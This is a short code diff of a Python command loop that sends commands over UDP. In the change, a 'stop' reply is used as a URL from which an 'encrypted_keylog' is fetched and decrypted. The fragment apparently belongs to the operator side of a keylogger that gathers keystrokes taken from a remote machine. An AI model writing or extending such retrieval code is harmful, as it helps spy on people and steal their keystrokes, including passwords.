@@ -40,7 +40,9 @@ while True:
         sock.sendto(cmd.encode(), send_addr)
         if cmd == "stop":
             msg, send_addr = sock.recvfrom(64)
-            print(msg)
+            encrypted_keylog = get(msg).text
+            decrypt(encrypted_keylog)
+            exit()
     else:
         exit()
 
